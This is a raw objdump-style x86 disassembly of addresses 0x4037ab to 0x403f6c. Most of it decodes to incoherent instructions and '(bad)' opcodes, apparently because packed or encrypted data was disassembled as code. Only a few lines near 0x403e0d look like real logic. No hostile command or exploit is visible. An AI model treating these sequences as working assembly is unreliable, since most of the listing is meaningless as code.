  4037ab:	div    BYTE PTR [eax]
  4037ad:	mov    bh,0x6b
  4037af:	mov    dl,0x19
  4037b1:	arpl   WORD PTR [edx-0x5f],bp
  4037b4:	dec    esp
  4037b6:	mov    al,0xcb
  4037b8:	js     0x40376b
  4037ba:	cli    
  4037bb:	sbb    eax,DWORD PTR [esi]
  4037bd:	clc    
  4037be:	inc    ebx
  4037bf:	bound  eax,QWORD PTR [edx+0x290b072e]
  4037c5:	pop    es
  4037c6:	test   eax,0x3cc002e3
  4037cb:	stc    
  4037cc:	jno    0x40379b
  4037ce:	pusha  
  4037cf:	(bad)  
  4037d1:	add    ah,BYTE PTR [esp+ebp*4-0x5b]
  4037d5:	and    al,0x9b
  4037d7:	enter  0x49b2,0xc
  4037db:	lea    esp,[edi-0x13]
  4037de:	lock mov ch,0x6a
  4037e1:	in     al,dx
  4037e2:	cmp    BYTE PTR [ebp-0x38],cl
  4037e5:	pushf  
  4037e6:	add    BYTE PTR [edx+0x14],ah
  4037e9:	sub    BYTE PTR [eax],ah
  4037eb:	adc    eax,0xf33febfb
  4037f0:	fs dec ecx
  4037f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037f3:	jge    0x4037b3
  4037f5:	pop    ecx
  4037f6:	out    0xd6,eax
  4037f8:	rcr    DWORD PTR [edx-0x1086fca6],cl
  4037fe:	and    ch,BYTE PTR [esi-0x4e]
  403801:	fcmovb st,st(7)
  403803:	mov    edi,0x90e33d3f
  403808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403809:	pop    ss
  40380a:	or     eax,0x36300120
  40380f:	inc    DWORD PTR [edx+ebx*8]
  403812:	mov    ds:0x2670e4f7,al
  403817:	stos   BYTE PTR es:[edi],al
  403818:	push   es
  403819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40381a:	test   dh,al
  40381c:	imul   esi,DWORD PTR [esi-0x6f],0x8cca4ceb
  403823:	outs   dx,DWORD PTR ds:[esi]
  403824:	mov    bl,0xbf
  403826:	mov    BYTE PTR [esi+0x181cf765],bl
  40382c:	(bad)  [ecx-0x70]
  40382f:	push   ss
  403830:	shl    DWORD PTR [ebp-0x4ae0c439],cl
  403836:	push   es
  403837:	mov    esp,0x22d7eb03
  40383c:	sti    
  40383d:	test   al,0x45
  40383f:	mov    ah,BYTE PTR [edx]
  403841:	cwde   
  403842:	mov    ds:0x256ae564,al
  403847:	xchg   ecx,eax
  403848:	push   esi
  403849:	(bad)  
  40384a:	rol    BYTE PTR [ecx-0x25],0xe5
  40384e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40384f:	dec    ecx
  403850:	hlt    
  403851:	mov    bh,0x94
  403853:	(bad)  
  403854:	cmc    
  403855:	outs   dx,BYTE PTR ss:[esi]
  403857:	xchg   ecx,eax
  403858:	ja     0x403834
  40385a:	rcl    DWORD PTR [ebx],1
  40385c:	mul    BYTE PTR [edi+0x52]
  40385f:	xor    BYTE PTR [esi],al
  403861:	or     DWORD PTR [esi],ebp
  403863:	pop    edi
  403864:	jae    0x4037f8
  403866:	push   esi
  403867:	out    dx,eax
  403868:	stos   BYTE PTR es:[edi],al
  403869:	xchg   BYTE PTR [edi-0xc73593f],dh
  40386f:	and    DWORD PTR [esi+ebx*2+0x75e78751],edx
  403876:	jl     0x403884
  403878:	int    0x33
  40387a:	mov    fs,WORD PTR [ebx+ebx*2-0x11]
  40387e:	xchg   edx,eax
  40387f:	mov    al,ds:0xfd6cd1b6
  403884:	mov    bh,0x4e
  403886:	sti    
  403887:	cmp    esp,DWORD PTR [edi]
  403889:	cmp    BYTE PTR ds:0xc10d12d7,bl
  40388f:	out    dx,eax
  403890:	dec    edi
  403891:	push   cs
  403892:	cmp    BYTE PTR [edx],bh
  403894:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403895:	leave  
  403896:	xor    al,0x4c
  403898:	sub    ch,al
  40389a:	push   edi
  40389b:	inc    edi
  40389c:	rol    BYTE PTR [ecx-0x7bb51544],0x79
  4038a3:	add    BYTE PTR [ecx],bl
  4038a5:	lods   al,BYTE PTR ds:[esi]
  4038a6:	popf   
  4038a7:	mov    al,0x94
  4038a9:	jp     0x403915
  4038ab:	jmp    0x3ba8:0x4c8a597a
  4038b2:	cdq    
  4038b3:	adc    al,0x66
  4038b5:	jnp    0x403838
  4038b7:	shl    DWORD PTR [esi],cl
  4038b9:	jp     0x40391e
  4038bb:	dec    edi
  4038bc:	push   esp
  4038bd:	mov    eax,ds:0x48ad71f
  4038c2:	or     cl,ch
  4038c4:	call   0xc6d3:0xce000002
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x2d405f3
  4038d5:	(bad)  
  4038d6:	arpl   ax,bp
  4038d8:	adc    al,0x1d
  4038da:	js     0x403954
  4038dc:	(bad)  
  4038dd:	jle    0x403957
  4038df:	js     0x4038d4
  4038e1:	mov    edi,0xb1722355
  4038e6:	xor    dh,ch
  4038e8:	push   edx
  4038e9:	xlat   BYTE PTR ds:[ebx]
  4038ea:	sub    eax,0xf54b3763
  4038ef:	inc    esp
  4038f0:	pop    eax
  4038f1:	rcr    DWORD PTR [ecx-0x2193c16f],0x51
  4038f8:	inc    ebp
  4038f9:	je     0x4038da
  4038fb:	sbb    eax,0x6789477c
  403900:	jp     0x4038c9
  403902:	push   es
  403903:	push   esi
  403904:	push   edi
  403905:	fwait
  403906:	or     edx,DWORD PTR [ecx]
  403908:	pop    eax
  403909:	fwait
  40390a:	sub    eax,0x64f314ba
  40390f:	sub    eax,0x6c59db51
  403914:	push   esi
  403915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403916:	xor    ecx,esp
  403918:	stos   BYTE PTR es:[edi],al
  403919:	mov    dh,0x5f
  40391b:	aam    0xa1
  40391d:	mov    ds:0x3745ac16,al
  403922:	popa   
  403923:	ds scas al,BYTE PTR es:[edi]
  403925:	repnz test DWORD PTR [ebx+0x234b835f],esi
  40392c:	cmp    DWORD PTR [edx+0x778196c],edi
  403932:	xor    ah,ch
  403934:	aad    0x8b
  403936:	int    0xb9
  403938:	inc    edx
  403939:	jnp    0x4039b2
  40393b:	or     cl,ah
  40393d:	pop    edx
  40393e:	shl    BYTE PTR [ecx+ebp*2-0x6500fa14],0xaf
  403946:	push   ecx
  403947:	sbb    eax,0xf8743ed9
  40394c:	gs dec edx
  40394e:	stos   DWORD PTR es:[edi],eax
  40394f:	xchg   bl,ah
  403951:	mov    ah,0x7a
  403953:	sbb    eax,0xc0b09c0a
  403958:	mov    esi,fs
  40395a:	lods   al,BYTE PTR ds:[esi]
  40395b:	enter  0x1693,0x72
  40395f:	icebp  
  403960:	pop    ebx
  403961:	frstpm(287 only) 
  403963:	add    al,0x40
  403965:	(bad)  
  403966:	jg     0x40391a
  403968:	xchg   ebp,eax
  403969:	cmp    ah,BYTE PTR [ecx-0x3a38fe64]
  40396f:	sub    BYTE PTR [esi+eiz*1-0x38],ch
  403973:	pop    esi
  403974:	adc    eax,0xc12363ad
  403979:	mov    ds:0xdde147c4,al
  40397e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40397f:	pushf  
  403980:	push   ecx
  403981:	mov    al,ds:0x26350e87
  403986:	mov    edi,ebx
  403988:	add    eax,0x934da3be
  40398d:	repnz stos BYTE PTR es:[edi],al
  40398f:	lock mov BYTE PTR [eax-0x3e],dl
  403993:	pop    eax
  403994:	pop    esp
  403995:	dec    ebx
  403996:	fnstcw WORD PTR [eax]
  403998:	dec    edx
  403999:	fmul   DWORD PTR [ebx+0x3c9d25f7]
  40399f:	into   
  4039a0:	test   BYTE PTR [edi-0x48f745e6],dl
  4039a6:	lahf   
  4039a7:	leave  
  4039a8:	dec    esi
  4039a9:	xor    eax,0xac089414
  4039ae:	push   esi
  4039af:	jp     0x403965
  4039b1:	jne    0x4039be
  4039b3:	int    0x65
  4039b5:	jle    0x4039f4
  4039b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039b8:	in     eax,dx
  4039b9:	mov    eax,esi
  4039bb:	inc    ebp
  4039bc:	sub    al,0xa3
  4039be:	fbld   TBYTE PTR [ebx-0x5ea6bea7]
  4039c4:	jl     0x403968
  4039c6:	shr    DWORD PTR [ebx+esi*8+0x33],0xc3
  4039cb:	xchg   ebx,eax
  4039cc:	pop    ecx
  4039cd:	push   ecx
  4039ce:	(bad)
  4039d1:	and    BYTE PTR [edx+0x77a1759e],dl
  4039d7:	ss mov edi,0xbabf5ff
  4039dd:	xchg   esi,eax
  4039de:	jb     0x403989
  4039e0:	aad    0x27
  4039e2:	imul   edx,ebp,0xfffffff7
  4039e5:	aaa    
  4039e6:	inc    esp
  4039e7:	mov    esp,DWORD PTR [ebx+0x32]
  4039ea:	xor    bl,BYTE PTR [ecx]
  4039ec:	test   DWORD PTR [ebp+ebp*1+0x73],edi
  4039f0:	mov    al,0xb3
  4039f2:	add    esi,DWORD PTR [eax]
  4039f4:	cld    
  4039f5:	(bad)  
  4039f6:	bound  eax,QWORD PTR [edi-0x2a13de84]
  4039fc:	and    eax,0x7bb1a726
  403a01:	mov    WORD PTR [eax-0x752b17db],cs
  403a07:	jge    0x4039bc
  403a09:	out    0x2d,al
  403a0b:	out    dx,eax
  403a0c:	retf   0x9834
  403a0f:	hlt    
  403a10:	or     ah,dl
  403a12:	aam    0xa6
  403a14:	adc    edx,edx
  403a16:	std    
  403a17:	mov    gs,WORD PTR [ebp+0x3140cb58]
  403a1d:	mov    bh,0xa9
  403a1f:	and    DWORD PTR [edi-0x15],esp
  403a22:	xor    DWORD PTR [ebp-0x19],edx
  403a25:	inc    ebp
  403a26:	xchg   DWORD PTR [edi-0x39],esp
  403a29:	outs   dx,BYTE PTR ds:[esi]
  403a2a:	dec    ebp
  403a2b:	sub    DWORD PTR [edx-0x6efa8903],esp
  403a31:	jp     0x4039bc
  403a33:	adc    eax,0x4805ae0a
  403a38:	cmp    edx,DWORD PTR [ebp-0x65]
  403a3b:	pop    ds
  403a3c:	or     al,0x1
  403a3e:	pop    edx
  403a3f:	mov    dh,0xe6
  403a41:	xor    bh,0xcc
  403a44:	cmp    DWORD PTR [esi-0x2d],eax
  403a47:	pushf  
  403a48:	mov    bh,0x81
  403a4a:	je     0x403abc
  403a4c:	jmp    0xb0ddce3e
  403a51:	cmp    BYTE PTR [ebp+0x27],dh
  403a54:	add    bl,BYTE PTR [edi-0x40a5aee8]
  403a5a:	or     eax,0x2b5c9d6e
  403a5f:	outs   dx,BYTE PTR ds:[esi]
  403a60:	mov    ah,0xe
  403a62:	pop    esi
  403a63:	xchg   esi,edx
  403a65:	or     bh,BYTE PTR [edx-0x209ac752]
  403a6b:	jbe    0x403a4d
  403a6d:	mov    bl,0x50
  403a6f:	and    eax,0x61bebcc3
  403a74:	int    0x90
  403a76:	push   ebx
  403a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a78:	pop    edx
  403a79:	sub    DWORD PTR [edx],eax
  403a7b:	push   0x2e
  403a7d:	inc    esp
  403a7e:	inc    edx
  403a7f:	call   0x57f0e84b
  403a84:	repnz sbb DWORD PTR [edx+0x71],esi
  403a88:	mov    ah,0xd6
  403a8a:	sub    al,0xd8
  403a8c:	jg     0x403aa5
  403a8e:	sbb    ebp,0xfffffffc
  403a91:	xchg   edx,eax
  403a92:	mov    edx,0x6f06ca8b
  403a97:	sub    eax,0x97ad48b9
  403a9c:	dec    esp
  403a9d:	cmp    ebp,ebp
  403a9f:	pop    edi
  403aa0:	mov    al,0x9b
  403aa2:	in     al,0x19
  403aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aa5:	jae    0x403a4d
  403aa7:	je     0x403aa3
  403aa9:	fist   WORD PTR [esi+0x70]
  403aac:	and    BYTE PTR [ebx],0xda
  403aaf:	xchg   esi,eax
  403ab0:	(bad)  
  403ab1:	enter  0x2465,0x1c
  403ab5:	mov    al,bh
  403ab7:	outs   dx,BYTE PTR ds:[esi]
  403ab8:	pop    esp
  403ab9:	fstp   TBYTE PTR [ebx+0xb600e3e]
  403abf:	push   0x18
  403ac1:	test   eax,0x1d78d88a
  403ac6:	sti    
  403ac7:	jb     0x403ad2
  403ac9:	sti    
  403aca:	mov    al,ds:0xffa92da1
  403acf:	imul   ebp,DWORD PTR [edi+0x75],0xace49414
  403ad6:	pop    ecx
  403ad7:	int    0x55
  403ad9:	cmp    eax,0x8cec7684
  403ade:	hlt    
  403adf:	mov    eax,0x12702ded
  403ae4:	fbld   TBYTE PTR [ecx+0x3f]
  403ae7:	mov    bh,BYTE PTR [ecx-0x58bc298]
  403aed:	mov    ebp,0x21b476a8
  403af2:	cld    
  403af3:	mov    dh,0xa4
  403af5:	mov    eax,ds:0xeb2df367
  403afa:	lods   eax,DWORD PTR ds:[esi]
  403afb:	int    0xfb
  403afd:	or     eax,0xa9494174
  403b02:	jg     0x403ae4
  403b04:	jae    0x403aca
  403b06:	pop    esi
  403b07:	jmp    0xf41a215b
  403b0c:	mov    al,0x1b
  403b0e:	aad    0xf5
  403b10:	push   esp
  403b11:	push   edi
  403b12:	gs sub ah,dl
  403b15:	stos   BYTE PTR es:[edi],al
  403b16:	cmp    bh,cl
  403b18:	jge    0x403ac0
  403b1a:	inc    esp
  403b1b:	iret   
  403b1c:	sti    
  403b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b1e:	(bad)  
  403b1f:	mov    BYTE PTR [edi],dh
  403b21:	sbb    ah,ch
  403b23:	pop    edx
  403b24:	add    dl,BYTE PTR [ebp-0x73]
  403b27:	lahf   
  403b28:	cmp    ah,BYTE PTR [ecx+0x48]
  403b2b:	loopne 0x403aea
  403b2d:	or     BYTE PTR [eax],ah
  403b2f:	pop    ebp
  403b30:	sti    
  403b31:	aad    0xc0
  403b33:	dec    eax
  403b34:	lods   al,BYTE PTR ds:[esi]
  403b35:	test   DWORD PTR [edi],0x88e07bd0
  403b3b:	fimul  DWORD PTR [ebx-0xe]
  403b3e:	int    0xf
  403b40:	sub    edi,DWORD PTR [eax-0x3b34d4c1]
  403b46:	stc    
  403b47:	mov    eax,0xec961962
  403b4c:	or     ch,BYTE PTR [eax+ebp*4-0x1e9bb97c]
  403b53:	mov    WORD PTR [esi],?
  403b55:	icebp  
  403b56:	hlt    
  403b57:	adc    ebx,DWORD PTR [esi+0x21]
  403b5a:	fcom   DWORD PTR [eax+0x36]
  403b5d:	cmp    DWORD PTR [ebp+0x44],esp
  403b60:	push   ds
  403b61:	ja     0x403b67
  403b63:	cmp    esi,DWORD PTR [ebx+eax*2]
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	push   ebx
  403b80:	ins    DWORD PTR es:[edi],dx
  403b81:	mov    eax,0x78239a66
  403b86:	js     0x403b86
  403b88:	jle    0x403c02
  403b8a:	js     0x403be2
  403b8c:	add    DWORD PTR [edi+0x235ace03],edx
  403b92:	xchg   edx,eax
  403b93:	mov    bh,0x96
  403b95:	rcr    esi,cl
  403b97:	ret    
  403b98:	cmp    eax,0xc03437de
  403b9d:	popf   
  403b9e:	clc    
  403b9f:	pop    esp
  403ba0:	or     al,0xa6
  403ba2:	in     al,dx
  403ba3:	(bad)  [edx+0x0]
  403ba6:	jl     0x403b36
  403ba8:	mov    eax,0x5ba4152c
  403bad:	retf   0x1ed1
  403bb0:	test   DWORD PTR [edx-0x4517f616],esi
  403bb6:	pop    ebx
  403bb7:	mov    eax,ds:0xa6b0a76b
  403bbc:	scas   eax,DWORD PTR es:[edi]
  403bbd:	sub    ax,WORD PTR [edi-0x71]
  403bc1:	sahf   
  403bc2:	mov    bl,BYTE PTR [ebx+0x9]
  403bc5:	daa    
  403bc6:	jmp    0x403bb2
  403bc8:	or     eax,DWORD PTR [esi]
  403bca:	call   0x1e4aed90
  403bcf:	in     al,0x8a
  403bd1:	sbb    eax,0xb1f0a676
  403bd6:	add    al,0x92
  403bd8:	(bad)  
  403bd9:	pop    esi
  403bda:	adc    BYTE PTR [ebx-0x2a],0x29
  403bde:	adc    edx,esi
  403be0:	popa   
  403be1:	mov    esp,0x32304f13
  403be6:	cs dec esi
  403be8:	shl    DWORD PTR [esi-0x79],0x50
  403bec:	daa    
  403bed:	icebp  
  403bee:	mov    edx,0x16901d2e
  403bf3:	push   ds
  403bf4:	repz mov cs,WORD PTR [edi]
  403bf7:	(bad)  
  403bf8:	sti    
  403bf9:	pop    ebp
  403bfa:	pop    edi
  403bfb:	jmp    0x94be:0x356dd137
  403c02:	xchg   esp,eax
  403c03:	or     eax,0xd9d18846
  403c08:	adc    eax,0xcf9be081
  403c0d:	xchg   esp,eax
  403c0e:	pop    ds
  403c0f:	sub    eax,0x7ac2e00
  403c14:	rcr    ch,1
  403c16:	cmp    cl,BYTE PTR [edx-0x3ae3e2b0]
  403c1c:	lods   al,BYTE PTR ds:[esi]
  403c1d:	hlt    
  403c1e:	or     eax,0x6d887213
  403c23:	push   edi
  403c24:	sub    BYTE PTR ds:0xddd2d665,0x84
  403c2b:	pop    ebp
  403c2c:	outs   dx,BYTE PTR ds:[esi]
  403c2d:	in     eax,dx
  403c2e:	sahf   
  403c2f:	fcmovb st,st(7)
  403c31:	jno    0x403c77
  403c33:	shr    DWORD PTR [edi+0x1d],1
  403c36:	push   ebp
  403c37:	fcom   QWORD PTR [edx+0x68fb410a]
  403c3d:	mov    esi,0x4efdfc23
  403c42:	std    
  403c43:	jnp    0x403bc9
  403c45:	inc    edx
  403c46:	pop    ss
  403c47:	and    eax,ebx
  403c49:	inc    edi
  403c4a:	or     al,0xfa
  403c4c:	lods   eax,DWORD PTR ds:[esi]
  403c4d:	pop    edx
  403c4e:	pop    ecx
  403c4f:	loope  0x403bf1
  403c51:	inc    esi
  403c52:	std    
  403c53:	mov    ah,0xb1
  403c55:	xor    edi,DWORD PTR [edi+0x33]
  403c58:	jns    0x403c5b
  403c5a:	mov    bh,0xb8
  403c5c:	add    al,0xd0
  403c5e:	les    ecx,FWORD PTR [eax]
  403c60:	mov    ch,0xf4
  403c62:	cmp    esp,edi
  403c64:	push   ds
  403c65:	pop    ss
  403c66:	inc    eax
  403c67:	or     edx,DWORD PTR [edi+0x4ee4318e]
  403c6d:	adc    bl,ch
  403c6f:	adc    al,0x91
  403c71:	xchg   edi,eax
  403c72:	mov    al,0x12
  403c74:	add    eax,0x2c003aea
  403c79:	xchg   edx,eax
  403c7a:	add    ebx,DWORD PTR [ebx-0x4c81df7a]
  403c80:	or     dl,bl
  403c82:	mov    cs,WORD PTR [edx]
  403c84:	lods   al,BYTE PTR ds:[esi]
  403c85:	test   DWORD PTR [esi+0x3b91f652],0x8344122f
  403c8f:	test   al,0xdf
  403c91:	jns    0x403c9b
  403c93:	je     0x403c93
  403c95:	xchg   BYTE PTR [ebp+0x34ad547a],dl
  403c9b:	or     dl,BYTE PTR [eax+0x2b4cea99]
  403ca1:	loope  0x403c28
  403ca3:	inc    edx
  403ca4:	mov    ebx,0x73c61eb7
  403ca9:	xchg   DWORD PTR [edi],esi
  403cab:	imul   esi,ebx,0x58d7a5e3
  403cb1:	jmp    0x403c45
  403cb3:	and    ch,al
  403cb5:	xor    BYTE PTR [ecx],al
  403cb7:	mov    bl,0x19
  403cb9:	in     al,0xef
  403cbb:	cmp    al,0x21
  403cbd:	inc    ebx
  403cbe:	int3   
  403cbf:	mov    bh,0xa3
  403cc1:	or     BYTE PTR [ecx+ebx*2+0x6bdd6988],0x6c
  403cc9:	pop    ss
  403cca:	cld    
  403ccb:	loope  0x403ccf
  403ccd:	inc    ebp
  403cce:	or     ah,dh
  403cd0:	aam    0xb2
  403cd2:	adc    al,0x2
  403cd4:	into   
  403cd5:	pop    eax
  403cd6:	je     0x403c68
  403cd8:	dec    edx
  403cd9:	cmp    edi,DWORD PTR [ebp-0x21777682]
  403cdf:	(bad)  [ebp-0x52]
  403ce2:	xlat   BYTE PTR ds:[bx]
  403ce4:	loope  0x403d05
  403ce6:	call   0x970a608f
  403ceb:	xor    DWORD PTR [eax+0x6c3a71c9],eax
  403cf1:	sar    BYTE PTR [edi+0xebb538f],1
  403cf7:	sahf   
  403cf8:	fld    DWORD PTR [ebx-0xc]
  403cfb:	sbb    eax,0x3a9d2d
  403d00:	fwait
  403d01:	retf   
  403d02:	icebp  
  403d03:	shld   DWORD PTR [esi-0x6d16ef61],edi,cl
  403d0a:	dec    esp
  403d0b:	jbe    0x403d29
  403d0d:	xor    bh,BYTE PTR [edx]
  403d0f:	and    eax,0xc2ba5fc2
  403d14:	shl    BYTE PTR [esi+0x63696822],cl
  403d1a:	add    al,0x8d
  403d1c:	push   esi
  403d1d:	inc    esi
  403d1e:	pop    ebp
  403d1f:	add    esi,ebx
  403d21:	mov    esp,0x413d94a0
  403d26:	dec    edi
  403d27:	les    ecx,FWORD PTR [ecx+0x68]
  403d2a:	add    eax,0x5bd8a8e2
  403d2f:	idiv   bl
  403d31:	imul   ebx,DWORD PTR [eax-0x63e11f69],0x30ed89de
  403d3b:	push   ebp
  403d3c:	cli    
  403d3d:	adc    bl,BYTE PTR [edi]
  403d3f:	scas   eax,DWORD PTR es:[edi]
  403d40:	ret    
  403d41:	sub    ebx,0xffffffd6
  403d44:	sbb    eax,DWORD PTR ds:0x49dd0b78
  403d4a:	push   edx
  403d4b:	addr16 sbb ah,ah
  403d4e:	push   0xffffffc6
  403d50:	inc    eax
  403d51:	mov    edx,0x30bdff7
  403d56:	xchg   ebp,eax
  403d57:	xchg   edi,ecx
  403d59:	cdq    
  403d5a:	jl     0x403d5e
  403d5c:	ja     0x403daa
  403d5e:	push   esi
  403d5f:	or     eax,0x254bd0ba
  403d64:	pop    esi
  403d65:	test   eax,0xbd57193f
  403d6a:	mov    dl,0x52
  403d6c:	xchg   BYTE PTR [eax-0x74263bf],al
  403d72:	and    BYTE PTR ds:[ebx],al
  403d75:	ror    ch,1
  403d77:	xor    al,0x44
  403d79:	xchg   eax,esp
  403d7b:	xor    DWORD PTR [eax+0x124ca0dd],ebx
  403d81:	inc    esp
  403d82:	pop    ss
  403d83:	mov    ecx,0xe3149953
  403d88:	pop    es
  403d89:	aam    0xb7
  403d8b:	shl    DWORD PTR [esi+edi*4-0x46],0x44
  403d90:	ins    DWORD PTR es:[edi],dx
  403d91:	mov    ds:0x5c419446,al
  403d96:	scas   al,BYTE PTR es:[edi]
  403d97:	mov    cl,0x45
  403d99:	xor    BYTE PTR [ebp-0x52262396],cl
  403d9f:	pop    ebx
  403da0:	sbb    BYTE PTR [eax-0x34],ch
  403da3:	lds    ebx,FWORD PTR [esi-0x65]
  403da6:	fucompp 
  403da8:	imul   edx,esi,0xa4573609
  403dae:	fiadd  DWORD PTR [edi]
  403db0:	lods   al,BYTE PTR ds:[esi]
  403db1:	push   0x5cff776b
  403db6:	or     BYTE PTR [ebp+0x41],0xef
  403dba:	daa    
  403dbb:	aam    0x75
  403dbd:	jnp    0x403d5c
  403dbf:	jnp    0x403e00
  403dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dc2:	jne    0x403d86
  403dc4:	pop    ss
  403dc5:	cmp    esi,DWORD PTR [edi]
  403dc7:	inc    ecx
  403dc8:	pop    DWORD PTR [edi+eax*8]
  403dcb:	in     eax,0x2d
  403dcd:	leave  
  403dce:	jp     0x403dfe
  403dd0:	push   ds
  403dd1:	jp     0x403d5e
  403dd3:	ja     0x403de0
  403dd5:	in     al,0x67
  403dd7:	ins    DWORD PTR es:[edi],dx
  403dd8:	xchg   ecx,eax
  403dd9:	imul   ebp,DWORD PTR [ecx-0x12],0xffffffe9
  403ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dde:	mov    esi,0xce96dcef
  403de3:	sbb    BYTE PTR [edx+0x28],dl
  403de6:	and    dl,BYTE PTR [ecx-0x18681c3c]
  403dec:	sbb    eax,0xcee33a80
  403df1:	dec    ebx
  403df2:	adc    DWORD PTR [eax-0x4b],edi
  403df5:	fs jmp 0x4d9045e3
  403dfb:	pop    esp
  403dfc:	adc    eax,0x6d5ae71
  403e01:	cli    
  403e02:	mov    ah,0xc8
  403e04:	push   0xdd388a10
  403e09:	jl     0x403e56
  403e0b:	(bad)  
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0x77dd8593
  403e30:	jae    0x403dd8
  403e32:	leave  
  403e33:	sbb    BYTE PTR [eax],ah
  403e35:	js     0x403eaf
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403de9
  403e3c:	mov    eax,0x5d800a99
  403e41:	mov    ecx,0xe2fbf759
  403e46:	inc    ebx
  403e47:	push   0xffffff94
  403e49:	mov    cl,dh
  403e4b:	xor    DWORD PTR [esi],ecx
  403e4d:	jns    0x403e34
  403e4f:	fist   WORD PTR [edx-0x4115f9b2]
  403e55:	sub    al,0x76
  403e57:	jb     0x403e96
  403e59:	scas   al,BYTE PTR es:[edi]
  403e5a:	cmc    
  403e5b:	and    BYTE PTR [eax+0x1ae36d71],dl
  403e61:	clc    
  403e62:	mul    al
  403e64:	push   es
  403e65:	dec    ebp
  403e66:	mov    dl,0xbc
  403e69:	imul   DWORD PTR [eax-0x526774e4]
  403e6f:	mov    esp,0x9d9daefe
  403e74:	pop    ecx
  403e75:	fucomi st,st(6)
  403e77:	fst    DWORD PTR [edx]
  403e79:	mov    ecx,0x1040d6db
  403e7e:	adc    al,0x53
  403e80:	ret    
  403e81:	mov    eax,0x5eab4da
  403e86:	daa    
  403e87:	cwde   
  403e88:	cmp    bl,BYTE PTR [esi+edx*8]
  403e8b:	(bad)  
  403e8c:	pop    ds
  403e8d:	or     al,0x55
  403e8f:	jnp    0x403e63
  403e91:	enter  0x2cb2,0x84
  403e95:	jecxz  0x403e49
  403e97:	leave  
  403e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e99:	ins    DWORD PTR es:[edi],dx
  403e9a:	ins    DWORD PTR es:[edi],dx
  403e9b:	clc    
  403e9c:	sub    eax,0x1326455d
  403ea1:	mov    cl,0x7a
  403ea3:	inc    ecx
  403ea4:	xchg   BYTE PTR [edi-0x4c60f4e4],bh
  403eaa:	xlat   BYTE PTR ds:[ebx]
  403eab:	jne    0x403e52
  403ead:	pushf  
  403eae:	out    0x2d,al
  403eb0:	adc    eax,0xecc33f20
  403eb5:	rol    BYTE PTR ds:0x63c30ff3,1
  403ebb:	stc    
  403ebc:	mov    ebx,ss
  403ebe:	dec    ecx
  403ebf:	es xchg esp,eax
  403ec1:	ret    0x5164
  403ec4:	mov    eax,0x786c63d4
  403ec9:	sti    
  403eca:	adc    dl,dl
  403ecc:	xchg   ecx,eax
  403ecd:	and    ah,bl
  403ecf:	(bad)  
  403ed0:	aas    
  403ed1:	jmp    0xd37c3529
  403ed6:	ror    DWORD PTR [eax-0x1d08b0ac],0xb5
  403edd:	xchg   esp,eax
  403ede:	mov    edx,ebx
  403ee0:	nop
  403ee1:	lds    eax,FWORD PTR ds:0xec9d1e
  403ee7:	inc    ebx
  403ee8:	test   al,0x43
  403eea:	jl     0x403f57
  403eec:	xor    dl,BYTE PTR [ebx+0xe9508ee]
  403ef2:	js     0x403f3f
  403ef4:	iret   
  403ef5:	popa   
  403ef6:	xchg   edi,eax
  403ef7:	cs daa 
  403ef9:	jb     0x403e97
  403efb:	(bad)  
  403efc:	pop    ds
  403efd:	push   edx
  403efe:	bound  esp,QWORD PTR [ebx+0x31]
  403f01:	neg    BYTE PTR [edi+ebx*1]
  403f04:	add    bh,ch
  403f06:	mov    esp,ecx
  403f08:	test   cl,dh
  403f0a:	sar    BYTE PTR [edx],1
  403f0c:	mov    bh,BYTE PTR [eax]
  403f0e:	leave  
  403f0f:	gs pop edx
  403f11:	outs   dx,DWORD PTR ds:[esi]
  403f12:	pop    ebx
  403f13:	xchg   ecx,eax
  403f14:	test   eax,0x91ffb227
  403f19:	lods   al,BYTE PTR ds:[esi]
  403f1a:	cmp    eax,0x50190d99
  403f1f:	ret    0xd345
  403f22:	arpl   WORD PTR [eax+eax*2+0x42],dx
  403f26:	xchg   esp,eax
  403f27:	(bad)  
  403f29:	test   BYTE PTR [eax-0x68],dl
  403f2c:	mov    edx,0x9fee4e25
  403f31:	push   0xf3cb0bf5
  403f36:	jo     0x403f43
  403f38:	aaa    
  403f39:	jge    0x403f8c
  403f3b:	aaa    
  403f3c:	gs push esi
  403f3e:	bound  eax,QWORD PTR [edi]
  403f40:	retf   0x2709
  403f43:	mov    al,ds:0xb1bbf0fe
  403f48:	add    ah,al
  403f4a:	aaa    
  403f4b:	retf   0xe4b2
  403f4e:	xlat   BYTE PTR ds:[ebx]
  403f4f:	adc    esp,edx
  403f51:	shl    BYTE PTR [esi],cl
  403f53:	adc    ebx,DWORD PTR [esi+0x3]
  403f56:	mov    ebp,0xd6c6c295
  403f5b:	jne    0x403ef6
  403f5d:	jo     0x403f6d
  403f5f:	jg     0x403efd
  403f61:	mov    ds:0xc37af26f,eax
  403f66:	cwde   
  403f67:	xchg   edx,eax
  403f68:	cmp    al,0xb5
  403f6a:	cwde   
  403f6b:	xchg   esi,eax
  403f6c:	mov    al,ds:0xde13e866
